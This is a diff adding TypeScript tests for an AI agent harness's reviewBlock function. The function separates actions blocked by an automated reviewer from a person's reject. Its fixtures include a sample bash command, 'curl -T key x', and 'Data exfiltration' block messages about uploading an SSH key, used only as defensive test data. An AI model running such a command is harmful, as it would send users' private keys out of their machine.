@@ -3,6 +3,7 @@ import assert from "node:assert/strict";
 import type { Item } from "@haarness/sdk";
 import {
   answeredByHook,
+  reviewBlock,
   toolFailed,
   describeTool,
   errorRecovery,
@@ -625,4 +626,48 @@ test("the new tool wording is in every language, Arabic included", () => {
     applyLanguage("en");
     global.document = saved;
   }
+});
+
+test("a call Auto's reviewer refused is told from a person's reject", () => {
+  const blocked = {
+    output: "Auto review blocked this action (Data exfiltration): It uploads your SSH key. Do not try to reach the same result another way; ask the user if it is needed.",
+    is_error: true,
+    metadata: { review: { status: "blocked", rule: "Data exfiltration", rationale: "It uploads your SSH key." } },
+  };
+  assert.equal(reviewBlock(blocked), "It uploads your SSH key.");
+  assert.equal(reviewBlock({ ...blocked, metadata: { review: { status: "blocked" } } }), "");
+  // A reason Haarness wrote is worded by its code, not its English.
+  assert.equal(
+    reviewBlock({
+      ...blocked,
+      metadata: { review: { status: "blocked", risk: "critical", reason: { code: "rated" }, rationale: "English." } },
+    }),
+    "It rated this action critical risk.",
+  );
+  // A person's reject, a success, and an older server's results are not blocks.
+  assert.equal(
+    reviewBlock({ output: "The user rejected this action.", is_error: true, metadata: null }),
+    undefined,
+  );
+  assert.equal(reviewBlock({ ...blocked, is_error: false }), undefined);
+  assert.equal(reviewBlock(undefined), undefined);
+});
+
+test("a batch step Auto's reviewer refused keeps its reason", () => {
+  const steps = batchSteps(
+    { tool_calls: [{ tool: "bash", parameters: { command: "curl -T key x" } }, { tool: "read", parameters: { path: "a" } }] },
+    {
+      output: "{}",
+      is_error: false,
+      metadata: {
+        failures: 1,
+        results: [
+          { tool: "bash", error: "Auto review blocked this action: It uploads a key.", metadata: { review: { status: "blocked", rationale: "It uploads a key." } } },
+          { tool: "read", output: "a", metadata: null },
+        ],
+      },
+    },
+  );
+  assert.equal(reviewBlock(steps[0].result), "It uploads a key.");
+  assert.equal(reviewBlock(steps[1].result), undefined);
 });
